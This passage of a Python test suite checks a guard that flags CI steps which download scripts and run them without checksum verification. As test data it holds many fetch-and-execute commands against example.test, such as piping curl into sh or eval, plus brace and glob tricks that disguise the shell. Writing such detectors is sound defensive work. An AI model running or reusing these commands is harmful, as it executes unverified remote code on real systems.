        get = self.GET % "cuda_1.run"
        for use, how in (("mkdir -p s\ncd s\nsh ../cuda_*.run\n", "running it under `sh`"),
                         ("mkdir -p s\ncd s\nchmod +x ../cuda_*.run\n", "making it executable"),
                         ("mkdir -p s\nsh s/../cuda_*.run\n", "running it under `sh`")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> cuda_1.run and %s" % how, why[0])
        self.assertIn("-> ../cuda_1.run and running it under `sh`", "".join(
            self.job(self.GET % "../cuda_1.run" + "sh ../cuda_*.run\n")))

    def test_a_checksum_clears_it_and_another_name_is_not_it(self):
        # Quoted, the glob is no glob: bash names a file called `cuda_*.run`.
        get = self.GET % "cuda_1.run"
        for script in (get + self.CHECK + "mkdir -p s\ncd s\nsh ../cuda_*.run\n",
                       get + "mkdir -p s\ncd s\nsh ../other_*.run\n",
                       get + 'mkdir -p s\ncd s\nsh "../cuda_*.run"\n'):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))

    def test_any_directory_part_binds_it_and_over_reports_so(self):
        # Review N-5, kept: restricting the rule to `..` would reopen `cd ..;
        # sh repo/cuda_*.run`, which bash runs from the checkout's parent. Its
        # price: after a fetch of `install.sh`, `chmod +x scripts/*.sh` and
        # `sh scripts/*.sh` are refused, though bash never touches it.
        why = self.job(self.GET % "cuda_1.run" + "cd ..\nsh repo/cuda_*.run\n")
        self.assertEqual(1, len(why), why)
        self.assertIn("-> cuda_1.run and running it under `sh`", why[0])
        get = "curl -fsSLo install.sh https://example.test/install.sh\n"
        for use in ("chmod +x scripts/*.sh\n", "sh scripts/*.sh\n"):
            with self.subTest(use=use):
                self.assertEqual(1, len(self.job(get + use)))


class TestAStaticWorkingDirectoryBindsPaths(unittest.TestCase):
    """#2427: resolve literal paths from the directory each statement runs in."""

    GET = "curl -fsSLo %s https://example.test/x.sh\n"
    CHECK = 'echo "%s  x.sh" | sha256sum -c -\n' % ("a" * 64)

    def defects(self, *steps):
        return [why for _name, why in wg.job_defects(steps)]

    def test_a_literal_cd_reaches_the_download(self):
        cases = (
            ("mkdir -p d\n" + self.GET % "d/x.sh" + "cd d\nsh x.sh\n", "d/x.sh"),
            (self.GET % "cuda_1.run" + "mkdir -p s\ncd s\nsh ../cuda_1.run\n",
             "cuda_1.run"),
        )
        for script, dest in cases:
            with self.subTest(script=script):
                found = self.defects(("run", script))
                self.assertEqual(1, len(found), found)
                self.assertIn("-> %s and running it under `sh`" % dest, found[0])

    def test_the_fetch_and_alias_are_resolved_in_their_own_directories(self):
        fetched_there = "mkdir -p d\ncd d\n" + self.GET % "x.sh" + "sh x.sh\n"
        copied_there = ("mkdir -p d\n" + self.GET % "d/x.sh"
                        + "cd d\ncp x.sh y.sh\nsh y.sh\n")
        for script in (fetched_there, copied_there):
            with self.subTest(script=script):
                found = self.defects(("run", script))
                self.assertEqual(1, len(found), found)

    def test_a_glob_is_resolved_in_the_directory_where_bash_expands_it(self):
        script = "mkdir -p d\n" + self.GET % "d/x.sh" + "cd d\nsh x*.sh\n"
        found = self.defects(("run", script))
        self.assertEqual(1, len(found), found)

    def test_a_check_in_the_same_directory_still_clears_the_use(self):
        script = "mkdir -p d\n" + self.GET % "d/x.sh" + "cd d\n" + self.CHECK + "sh x.sh\n"
        self.assertEqual([], self.defects(("run", script)))

    def test_a_check_in_another_directory_does_not_clear_the_use(self):
        script = ("mkdir -p d elsewhere\n" + self.GET % "d/x.sh" + "cd elsewhere\n"
                  + self.CHECK + "sh ../d/x.sh\n")
        found = self.defects(("run", script))
        self.assertEqual(1, len(found), found)
        self.assertIn("no checksum in the job names", found[0])

    def test_a_written_checksum_list_is_bound_to_its_directory(self):
        digest = "a" * 64
        same = ("mkdir -p d\n" + self.GET % "d/x.sh"
                + f'echo "{digest}  x.sh" > d/SHA256SUMS\n'
                + "cd d\nsha256sum -c SHA256SUMS\nsh x.sh\n")
        self.assertEqual([], self.defects(("run", same)))
        other = ("mkdir -p d elsewhere\n" + self.GET % "d/x.sh"
                 + f'echo "{digest}  x.sh" > elsewhere/SHA256SUMS\n'
                 + "cd elsewhere\nsha256sum -c SHA256SUMS\nsh ../d/x.sh\n")
        found = self.defects(("run", other))
        self.assertEqual(1, len(found), found)
        self.assertIn("no checksum in the job names", found[0])

    def test_a_different_path_and_each_new_step_stay_clean(self):
        get = "mkdir -p d elsewhere\n" + self.GET % "d/x.sh"
        for steps in (
            (("run", get + "cd d\nsh other.sh\n"),),
            (("run", get + "cd elsewhere\nsh x.sh\n"),),
            (("get", get + "cd d\n"), ("run", "sh x.sh\n")),
        ):
            with self.subTest(steps=steps):
                self.assertEqual([], self.defects(*steps))

    def test_a_dynamic_or_branched_cd_makes_the_directory_unknown(self):
        get = "mkdir -p d\n" + self.GET % "d/x.sh"
        for change in ('D=d\ncd "$D"\n', "if true; then cd d; fi\n",
                       "pushd d >/dev/null\n"):
            with self.subTest(change=change):
                found = self.defects(("run", get + change + "sh x.sh\n"))
                self.assertEqual(1, len(found), found)
        self.assertEqual([], self.defects(("run", get + 'cd "$D"\nsh other.sh\n')))

    def test_a_cd_reached_through_a_conditional_list_is_unknown(self):
        script = self.GET % "x.sh" + "mkdir -p d\nfalse && cd d\nsh x.sh\n"
        found = self.defects(("run", script))
        self.assertEqual(1, len(found), found)

    def test_a_cd_whose_failure_does_not_stop_the_step_is_unknown(self):
        script = self.GET % "x.sh" + "set +e\ncd missing\nsh x.sh\n"
        found = self.defects(("run", script))
        self.assertEqual(1, len(found), found)

    def test_only_a_shell_builtin_cd_is_followed_as_literal(self):
        cases = (
            "mkdir -p d\n" + self.GET % "d/x.sh" + "builtin cd d\nsh x.sh\n",
            self.GET % "x.sh" + "mkdir -p d\nset +e\nenv cd d\nsh x.sh\n",
            "mkdir -p d\n" + self.GET % "d/x.sh" + "command cd d\nsh x.sh\n",
        )
        for script in cases:
            with self.subTest(script=script):
                found = self.defects(("run", script))
                self.assertEqual(1, len(found), found)

    def test_each_unknown_directory_change_gets_a_new_identity(self):
        one = ('mkdir -p d\nD=d\ncd "$D"\n' + self.GET % "x.sh"
               + self.CHECK + "sh x.sh\n")
        self.assertEqual([], self.defects(("run", one)))
        changed = ('mkdir -p d e\nD=d\nE=../e\ncd "$D"\n' + self.GET % "x.sh"
                   + 'cd "$E"\n' + self.CHECK + "sh x.sh\n")
        found = self.defects(("run", changed))
        self.assertEqual(1, len(found), found)

    def test_unknown_directory_identities_do_not_collide_across_steps(self):
        steps = (
            ("fetch", 'mkdir -p d e\nD=d\ncd "$D"\n' + self.GET % "x.sh"),
            ("wrong check", 'E=e\ncd "$E"\n' + self.CHECK),
            ("run", 'F=d\ncd "$F"\nsh x.sh\n'),
        )
        found = self.defects(*steps)
        self.assertEqual(1, len(found), found)
        self.assertIn("no checksum in the job names", found[0])

    def test_a_parent_of_an_unknown_directory_stays_in_that_step(self):
        steps = (
            ("fetch", self.GET % "x.sh"),
            ("wrong check", 'E=e/sub\ncd "$E"\ncd ..\n' + self.CHECK),
            ("run", "sh x.sh\n"),
        )
        found = self.defects(*steps)
        self.assertEqual(1, len(found), found)
        self.assertIn("no checksum in the job names", found[0])

    def test_a_cd_in_a_finished_subshell_does_not_change_its_caller(self):
        script = "mkdir -p d\n" + self.GET % "d/x.sh" + "(cd d)\nsh x.sh\n"
        self.assertEqual([], self.defects(("run", script)))

    def test_a_background_cd_does_not_change_its_caller(self):
        script = "mkdir -p d\n" + self.GET % "d/x.sh" + "cd d &\nsh x.sh\n"
        self.assertEqual([], self.defects(("run", script)))

    def test_a_use_inside_the_same_subshell_sees_its_literal_cd(self):
        script = "mkdir -p d\n" + self.GET % "d/x.sh" + "(\ncd d\nsh x.sh\n)\n"
        found = self.defects(("run", script))
        self.assertEqual(1, len(found), found)

    def test_a_use_inside_a_command_substitution_sees_its_own_cd(self):
        prefix = "mkdir -p d\n" + self.GET % "d/x.sh"
        for change in ("cd d", "set -e; cd d"):
            with self.subTest(change=change):
                found = self.defects(("run", prefix + f"y=$({change}; sh x.sh)\n"))
                self.assertEqual(1, len(found), found)

    def test_a_command_substitution_restores_its_callers_directory(self):
        script = ("mkdir -p d\n" + self.GET % "d/x.sh"
                  + "y=$(set -e; cd d; true)\nsh x.sh\n")
        self.assertEqual([], self.defects(("run", script)))

    def test_a_fetch_inside_a_command_substitution_keeps_its_cd(self):
        cases = (
            "y=$(set -e; mkdir -p d; cd d; " + self.GET.strip() % "x.sh"
            + "; cd ..; sh d/x.sh)\n",
            "y=$(set -e; mkdir -p d; cd d; " + self.GET.strip() % "../x.sh"
            + "; sh ../x.sh)\n",
        )
        for script in cases:
            with self.subTest(script=script):
                found = self.defects(("run", script))
                self.assertEqual(1, len(found), found)

    def test_a_substitution_fetch_stays_in_its_child_directory(self):
        script = ("mkdir -p d\n"
                  + "y=$(set -e; cd d; " + self.GET.strip() % "x.sh" + ")\n"
                  + "sh x.sh\n")
        self.assertEqual([], self.defects(("run", script)))

    def test_a_fetch_destination_keeps_xargs_rewrite_provenance(self):
        cases = (
            "printf x | xargs -I R curl -fsSLo d/R https://example.test/x\nsh R\n",
            "y=$(set -e; cd d; printf x | xargs -I R "
            "curl -fsSLo sub/R https://example.test/x; sh R)\n",
        )
        for script in cases:
            with self.subTest(script=script):
                self.assertEqual(1, len(self.defects(("run", script))))


class TestADownloadCarriedInAVariable(unittest.TestCase):
    """#2341: `x=$(curl -fsSL URL)` and then `eval "$x"`, `sh -c "$x"` or
    `echo "$x" | sh` read clean -- the fetch was read, writing to standard
    output, into a variable the guard never followed -- and bash 3.2 and 5.2
    run the download through each. A whole-word variable a plain fetch
    substitution assigned earlier in the step is now that fetch's output
    where it is handed to a shell as its script: no file ever holds it, so
    no checksum clears it, as none clears `eval "$(curl URL)"`."""

    GET = "x=$(curl -fsSL https://example.test/i.sh)\n"
    SAID = ("carries https://example.test/i.sh in `$x` and hands it to `%s`%s, so there "
            "is no file to check")
    READ = ("carries https://example.test/i.sh in `$x` and hands it to `%s`%s in this "
            "guard's conservative reading, so there is no file to check")

    def job(self, *scripts):
        return [why for _n, why in wg.job_defects(
            [("step %d" % n, script) for n, script in enumerate(scripts)])]

    def not_carried(self, *scripts):
        """The one sentence left where the name does not hold the download at
        the use: #2483's unread program word, which a dynamic program gets
        wherever a shell takes one and the job holds a fetch the guard
        reports -- never this class's carried sentence, which would name a
        download the step does not run."""
        why = self.job(*scripts)
        self.assertEqual(1, len(why), why)
        self.assertIn("a program this guard does not follow", why[0])
        self.assertNotIn("carries", why[0])

    def test_handed_whole_to_a_shell_it_is_the_download(self):
        for get in (self.GET, 'x="$(curl -fsSL https://example.test/i.sh)"\n',
                    "x=$(wget -qO- https://example.test/i.sh)\n",
                    "export x=$(curl -fsSL https://example.test/i.sh)\n"):
            for use, to in (('eval "$x"\n', "eval"), ("eval $x\n", "eval"),
                            ('eval "${x}"\n', "eval"), ('sh -c "$x"\n', "sh -c"),
                            ('bash -c "$x"\n', "bash -c"), ('echo "$x" | sh\n', "sh"),
                            ("printf '%s\\n' \"$x\" | bash\n", "bash")):
                with self.subTest(get=get, use=use):
                    why = self.job(get + use)
                    self.assertEqual(1, len(why), why)
                    said = self.READ if to in ("sh -c", "bash -c") else self.SAID
                    self.assertIn(said % (to, ""), why[0])
        # A trailing blank: bash 5.2.21, 3.2.57 and dash run the download as above (rc 0), but the
        # word is no longer `$x` whole, so this sentence does not bind it; #2483's unread program
        # word reports it instead, `Idle`, beside the download -- CLEAN until blanks around such a
        # word were no text of its own (`workflow_programs._all_expansion`).
        for use, how in (('eval "$x "\n', "eval"), ('sh -c "$x "\n', "sh -c")):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertTrue(why[0].startswith("runs `%s` on `$x`" % how), why)
                self.assertIsInstance(why[0], wg.Idle)

    def test_wherever_the_step_hands_it_over(self):
        for script, to, where in (
                (self.GET + 'y=$(echo "$x" | sh)\n', "sh", " inside a command substitution"),
                (self.GET + 'echo "$x" | tr -d "\\r" | sh -s -- --yes\n', "sh -s -- --yes", ""),
                ("f() {\n  local x=$(curl -fsSL https://example.test/i.sh)\n  eval \"$x\"\n}\n"
                 "f\n", "eval", ""),
                (self.GET + "x=$(curl -fsSL https://example.test/i.sh)\neval \"$x\"\n", "eval", ""),
                (self.GET + 'bash <(echo "$x")\n', "bash", ""),
                (self.GET + "source <(printf '%s\\n' \"$x\")\n", "source", ""),
                (self.GET + 'eval "$(echo "$x")"\n', "eval", "")):
            with self.subTest(script=script):
                why = self.job(script)
                self.assertEqual(1, len(why), why)
                said = self.READ if script.startswith("f()") else self.SAID
                self.assertIn(said % (to, where), why[0])
        # A whole copy holds it too, and the sentence names the variable used.
        for copy in ('y="$x"\n', "y=$x\n", 'export y="${x}"\n'):
            with self.subTest(copy=copy):
                why = self.job(self.GET + copy + 'eval "$y"\n')
                self.assertEqual(1, len(why), why)
                self.assertIn("carries https://example.test/i.sh in `$y` and hands it to `eval`",
                              why[0])
        # A script handed to `eval` in a substitution was refused already, in
        # a job that downloads (`substitution_script`); it now says what runs,
        # and that `Idle` hand-off is dropped beside the louder carried
        # sentence on its statement (#2490).
        why = self.job(self.GET + 'y=$(eval "$x")\n')
        self.assertEqual(1, len(why), why)
        self.assertIn(self.SAID % ("eval", " inside a command substitution"), why[0])

    def test_the_here_string_keeps_its_own_answer(self):
        # Already refused as an expanding here-string (#2293), with or without
        # the download: the same one sentence, and not a second.
        self.assertEqual(self.job('bash <<< "$x"\n'), self.job(self.GET + 'bash <<< "$x"\n'))
        self.assertIn("hands an EXPANDING heredoc body or here-string to `bash`",
                      "".join(self.job(self.GET + 'bash <<< "$x"\n')))

    def test_not_handed_to_a_shell_or_not_the_download_it_is_not(self):
        for script in (self.GET + 'echo "$x" > f\n',                 # the issue's control
                       self.GET + 'echo "$x"\n',
                       self.GET + 'echo "$x" | grep -c .\n',
                       self.GET + "sh -c 'echo hi' \"$x\"\n",         # there it is `$0`
                       self.GET + 'diff <(echo "$x") f\n'):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))
        # A `<(...)` a shell reads as its FILE hands it the program its printer prints (#2487):
        # `$y`, unspelled, is weighed as the pipe twin `echo "$y" | bash` is -- `_PRINTED`'s
        # `_Quiet`, never the carried sentence -- though no shell runs the download (b5 b3 dash gh:
        # F- F- F- F- for both): that twin's over-report, kept beside the download `x` holds.
        for use in ('bash <(echo "$y")\n', 'echo "$y" | bash\n'):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertTrue(why[0].startswith("pipes `bash` its program from `echo`"), why)
        # Where the shell IS handed a word, the download is not what it runs,
        # and #2483 reports the word itself (as it does the `$CMD -c "$x"`
        # twin beside the same download): one sentence, and not this one.
        for script in (self.GET + 'x=1\neval "$x"\n', self.GET + 'unset x\neval "$x"\n',
                       self.GET + 'eval "$y"\n', self.GET + 'y="$x"\ny=1\neval "$y"\n',
                       "x=$(curl -fsSLo f https://example.test/i.sh)\neval \"$x\"\n",
                       'eval "$x"\n' + self.GET):
            with self.subTest(script=script):
                self.not_carried(script)

    def test_each_step_is_a_shell_of_its_own(self):
        # A variable dies with the step's shell, so across two steps the word
        # carries no download and only #2483's sentence stands; in one step it
        # is the download, and that sentence is this class's.
        self.not_carried(self.GET, 'eval "$x"\n')
        why = self.job(self.GET + 'eval "$x"\n')
        self.assertEqual(1, len(why), why)
        self.assertIn("carries", why[0])

    def test_a_reassignment_bash_may_skip_or_run_elsewhere_keeps_it_held(self):
        # Review I-1: bash skips `x=1` behind `||` or in an untaken branch, and
        # runs it in a child shell for `sh -c`, so each of these still runs the
        # download; so does a pipeline stage's, in a subshell of its own. Only
        # a reassignment the step's own shell always runs empties it (`x=1`,
        # pinned CLEAN above). `eval 'x=:'` does run in the step's shell and
        # reads as a child's: an accepted over-report, beside its control.
        cases = (('[ -n "$x" ] || x=1\n', self.READ),
                 ('if [ -z "$x" ]; then x=1; fi\n', self.READ),
                 ("sh -c 'x=1'\n", self.SAID), ("x=1 | cat\n", self.SAID),
                 ("eval 'x=:'\n", self.READ), ("eval 'y=:'\n", self.SAID))
        for between, said in cases:
            with self.subTest(between=between):
                why = self.job(self.GET + between + 'eval "$x"\n')
                self.assertEqual(1, len(why), why)
                self.assertIn(said % ("eval", ""), why[0])

    def test_a_reassignment_outside_the_steps_own_scope_keeps_it_held(self):
        # Review I-2: bash runs `x=1 &` and `( x=1 )` in subshells, a function
        # body only when the function is called, and `local`/`declare` there in
        # the function's own scope, so each of these still runs the download.
        # A `{ }` group and a function body are read as `_errexit_states` reads
        # them, not as the step's own scope, though bash runs `{ x=1; }` and a
        # called `f() { x=1; }` in it and then runs nothing: accepted
        # over-reports. A group closed before the reassignment is out of the way,
        # its `(` or `)` on a line of its own too (#2420 keeps such a line).
        strong = ("x=1 &\nwait\n", "( x=1 )\n", "( cd .; x=1 )\n", "( ( x=1 ) )\n",
                  "(\n  x=1\n)\n")
        readings = ("f() { x=1; }\n", "f() {\n  x=1\n}\n", "function f { x=1; }\n",
                    "f() { local x=1; }\nf\n", "f() { declare x=1; }\nf\n",
                    "f() { x=1; }\nf\n", "{ x=1; }\n")
        for between in strong + readings:
            with self.subTest(between=between):
                why = self.job(self.GET + between + 'eval "$x"\n')
                self.assertEqual(1, len(why), why)
                said = self.SAID if between in strong else self.READ
                self.assertIn(said % ("eval", ""), why[0])
        for between in ("x=1\n", "{ :; }\nx=1\n", "( cd . )\nx=1\n", "( cd .\n)\nx=1\n",
                        "(\n  cd .\n)\nx=1\n", "f() { :; }\nx=1\n"):
            with self.subTest(between=between):
                self.not_carried(self.GET + between + 'eval "$x"\n')

    def test_a_fail_closed_carry_says_that_it_is_the_guards_reading(self):
        for between in ("if true; then x=1; fi\n", "{ x=1; }\n",
                        "f() { x=1; }\nf\n", "eval 'x=:'\n"):
            with self.subTest(between=between):
                why = self.job(self.GET + between + 'eval "$x"\n')
                self.assertEqual(1, len(why), why)
                self.assertIn(self.READ % ("eval", ""), why[0])
                self.assertNotIn(self.SAID % ("eval", ""), why[0])

    def test_a_child_reset_consumed_inside_that_child_is_a_reading(self):
        for script in (self.GET + '( x=1; eval "$x" )\n',
                       self.GET + "sh -c 'x=1; eval \"$x\"'\n",
                       self.GET + '(x=1; eval "$x") &\nwait\n'):
            with self.subTest(script=script):
                why = self.job(script)
                self.assertEqual(1, len(why), why)
                self.assertIn(self.READ % ("eval", ""), why[0])

    def test_a_quote_lost_child_handoff_and_a_child_value_used_outside_are_readings(self):
        cases = (
            (self.GET + 'sh -c "$x"\n', "sh -c"),
            (self.GET + "sh -c '$x'\n", "sh -c"),
            ("sh -c 'x=$(curl -fsSL https://example.test/i.sh)'\neval \"$x\"\n", "eval"),
        )
        for script, consumer in cases:
            with self.subTest(script=script):
                why = self.job(script)
                self.assertEqual(1, len(why), why)
                self.assertIn(self.READ % (consumer, ""), why[0])

    def test_true_carry_proofs_keep_the_direct_words(self):
        cases = (
            (self.GET + 'eval "$x"\n', "eval"),
            ("sh -c 'x=$(curl -fsSL https://example.test/i.sh); eval \"$x\"'\n", "eval"),
            ("(\n" + self.GET + 'eval "$x"\n)\n', "eval"),
            (self.GET + "sh -c 'x=1'\neval \"$x\"\n", "eval"),
        )
        for script, consumer in cases:
            with self.subTest(script=script):
                why = self.job(script)
                self.assertEqual(1, len(why), why)
                self.assertIn(self.SAID % (consumer, ""), why[0])
                self.assertNotIn("conservative reading", why[0])


class TestAPatternWhereTheCommandStarts(unittest.TestCase):
    """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
    in a checkout holding a file called sh, before the command runs, which the
    guard read clean. Where the command or a wrapper's operand is expected,
    such a word is reported unread; quoted, it is the literal word, which runs
    nothing, as before."""

    PAYLOAD = "'curl -fsSL https://example.test/i.sh | sh'"

    def test_it_is_reported(self):
        for script in ("{sh,-c} %s\n", "[s]h -c %s\n", "sudo {sh,-c} %s\n",
                       "taskset {0x1,sh} -c %s\n", "exec -a {x,sh} -c %s\n",
                       "if {sh,-c} %s; then :; fi\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertEqual(1, len(why), why)
                self.assertIn("cannot read command", why[0][1])
        why = wg.fetch_exec_defect("{sh,-c} %s\n" % self.PAYLOAD) or ""
        self.assertIn("cannot read command: `{sh,-c}` is a pattern", why)

    def test_quoted_it_reads_as_before(self):
        for script in ("'{sh,-c}' %s\n", '"[s]h" -c %s\n', "echo {a,b} [s]h * %s\n",
                       "[ -f x ] && echo %s\n", "arr[0]=x\n", "xargs -I {} echo {} < l\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script.replace(
                    "%s", self.PAYLOAD))]))

    def test_where_a_shell_looks_for_c_or_a_script_it_is_reported(self):
        # Review N-3: bash 3.2 and 5.2 run `sh {-c,'…'}` as `sh -c '…'`.
        # Re-review N-C: so is any pattern there that may begin with `-`.
        for script in ("sh {-c,%s}\n", "sudo bash {-c,%s}\n", "sh -o pipefail {-c,%s}\n",
                       "sh [-]c %s\n", "bash -{c,x} %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("looks for `-c` or a script", why[0][1] if why else "")
        for script in ("bash lint.sh src/*.py\n", "sh -c 'echo' {a,b}\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))

    def test_a_program_a_shell_is_handed_as_a_glob_binds_a_download(self):
        # Re-review N-C: a pattern that cannot begin with `-` is the program,
        # and runs a download it matches -- `sh ./cuda_*.run` after `curl -o
        # cuda_1.run`, which bash 3.2 and 5.2 run and base read clean for the
        # `./`. The glob binds with a leading `./` dropped and a brace read as
        # `*`, and with a `$` in it by its last part, which r1 reported as a
        # pattern alone; with nothing fetched it runs nothing unchecked.
        get = ("get", "curl -fsSL -o cuda_1.run https://example.test/c\n")
        for use in ("sh ./cuda_*.run --silent", "sudo sh ./cuda_*.run", "bash ./cuda_{1,2}.run",
                    "chmod +x ./cuda_*.run", 'sh "$PWD"/cuda_*.run', "sh $(pwd)/cuda_*.run",
                    "sh ${X}*"):
            with self.subTest(use=use):
                self.assertIn("cuda_1.run", "".join(w for _n, w in wg.job_defects(
                    [get, ("run", use + "\n")])))
        with self.subTest(use="checked, then sh ./cuda_*.run"):
            check = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)
            self.assertEqual([], wg.job_defects([get, ("run", check + "sh ./cuda_*.run\n")]))
        for script in ("sh scripts/*.sh\n", "bash [a-c]*.sh\n", "bash -n scripts/*.sh\n",
                       "sudo sh ./cuda_*.run\n", "bash ./build-{a,b}.sh\n", "sh ./configure*\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        with self.subTest(use="a download no glob matches"):
            self.assertEqual([], wg.job_defects([get, ("run", 'sh "$D"/*.sh ./x_*.run\n')]))

    def test_inside_an_expansion_or_arithmetic_there_is_none(self):
        # Review N-1: bash globs nothing written inside `${...}`, `((...))` or
        # `$((...))`, and these idioms were reported from #2294 on.
        for script in ("(( a[1]++ ))\n", "(( count[$k]++ ))\n", "${CMD[@]} --flag\n",
                       "${x#*/} --version\n", "${x%.*}\n", "if (( a[i] > 0 )); then :; fi\n",
                       "$(( a[1] * 2 )) --flag\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern beside or inside them, where bash globs it.
        for script in ("${x}[s]h -c %s\n", "(( a[1]++ )) && [s]h -c %s\n",
                       "((echo) ; [s]h -c %s)\n", "(( $([s]h -c %s) ))\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")

    def test_in_a_conditional_an_array_or_an_extglob_group_there_is_none(self):
        # Re-review I-5: 16 jobs in 10 calibration-pool repos, 14 of them
        # fetching nothing, failed on #2294's rule, where the reader put these
        # words where a command starts. Bash runs none of them: a conditional
        # expands no pattern, an array literal globs its words into the array,
        # and an extglob group is part of its word (`shopt -s extglob`).
        for script in ("results=(files/x/*)\n", "blockmaps=(static/dist/*.blockmap)\n",
                       "A=(${DIR}/*)\n", "arr=(*.txt)\n",
                       "files=(\n  dist/*.dmg\n  dist/*.exe\n)\n", "files+=(\n  **/*.sh\n)\n",
                       "declare -A t=(\n  [n8n]=${V}\n)\n",
                       "f() {\n  local -a x=( *.sh )\n}\n",
                       "if [[ $v =~ ^2\\.(0|[1-9]*)$ ]]; then :; fi\n",
                       "[[ $d =~ ME([[:space:]]|(\\\\[rn]))+ ]]\n",
                       "case 1.2 in\n  +([0-9]).+([0-9]) ) echo ok ;;\nesac\n",
                       "for f in @(*.deb|*.zip); do echo \"$f\"; done\n",
                       "rm -rf !(keep|*.md)\n", "x=@(a|b)\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern where a command starts, beside them or in a
        # substitution inside them; an extglob group that is the command or
        # stands where `sh` looks for `-c`, which bash with `extglob` on expands
        # (`@(sh)` to `sh`, given a file `sh`; `!(x)` too, which with it off
        # negates a subshell); a case arm's `[[)`, a pattern and no conditional;
        # and an array's `[` no `]` closes, which bash 3.2 reads on past as code.
        for script in ("( [s]h -c %s )\n", "{sh,-c} %s\n", "[s]h -c %s\n",
                       "arr=(*.txt); [s]h -c %s\n", "files=(\n  *.txt\n)\n[s]h -c %s\n",
                       "[[ -n x ]]&&[s]h -c %s\n", "arr=( $([s]h -c %s) )\n",
                       "[[ -n $([s]h -c %s) ]]\n", "shopt -s extglob\n@([s]h) -c %s\n",
                       "!([s]h -c %s)\n", "declare -A t=(\n  [a]=1\n)\n[s]h -c %s\n",
                       "shopt -s extglob\n@(sh) -c %s\n", "shopt -s extglob\nsh @(-c) %s\n",
                       "shopt -s extglob\n!(x) -c %s\n",
                       "case $x in\n  [[) [s]h -c %s ;;\nesac\n", "x=( [[ ) ; [s]h -c %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")


class TestTheFormsThatHideAFetch(unittest.TestCase):
    """Spellings that are not `curl <url> -o <file>` and mean the same thing.

    Every one of these is the #1647 shape -- a download the guard cannot SEE is
    reported as a clean step -- so each was probed against this parser before it
    was written down here, and each returned `fetches=[] defect=None` until the
    parser learned the form. A guard over shell must fail CLOSED on the shell it
    does not model.
    """

    def test_a_substituted_fetch_run_by_eval(self):
        why = wg.fetch_exec_defect('eval "$(curl -fsSL https://example.test/i.sh)"\n')
        self.assertIn("https://example.test/i.sh", why or "")

    def test_a_substituted_fetch_handed_to_sh_dash_c(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect('sh -c "$(curl -fsSL https://example.test/i.sh)"\n'))

    def test_a_backticked_fetch_run_by_eval(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("eval `curl -fsSL https://example.test/i.sh`\n"))

    def test_a_process_substitution_read_by_bash(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("bash <(curl -fsSL https://example.test/i.sh)\n"))

    def test_a_substituted_fetch_that_is_only_read_is_left_alone(self):
        # `VERSION=$(curl ...)` downloads a string into a variable. It is seen
        # -- it is a download -- but nothing runs those bytes.
        script = "VERSION=$(curl -fsSL https://example.test/version)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_piped_into_tee_lands_in_teeS_file(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /usr/local/bin/t > /dev/null\n"
                  "chmod +x /usr/local/bin/t\n")
        self.assertEqual("/usr/local/bin/t", wg.fetches(script)[0].dest)
        self.assertIn("/usr/local/bin/t", wg.fetch_exec_defect(script) or "")

    def test_a_checksum_can_clear_a_tee(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /tmp/t > /dev/null\n"
                  'echo "%s  /tmp/t" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/t\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_inside_an_if(self):
        script = ("if curl -fsSL https://example.test/x -o /tmp/x; then\n"
                  "  chmod +x /tmp/x\n"
                  "fi\n")
        self.assertIn("/tmp/x", wg.fetch_exec_defect(script) or "")

    def test_a_use_inside_a_loop_body(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "while true; do /tmp/p; done\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_curls_output_dir(self):
        script = ("curl -fsSLO --output-dir /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wgets_directory_prefix(self):
        script = ("wget -P /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_process_substitution_in_a_redirect(self):
        # M4: `bash < <(curl ...)` is the #1647 signature with one more layer:
        # the redirect target was discarded before substitutions were read, so
        # the fetch was not seen AT ALL.
        script = "bash < <(curl -fsSL https://example.test/i.sh)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_substitution_inside_an_unquoted_heredoc_body(self):
        # L5: `<<EOF` expands; `<<'EOF'` does not. The body of the expanding
        # one is shell, and a fetch in it reaches the interpreter reading it.
        script = "bash <<EOF\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual(1, len(wg.fetches(script)))
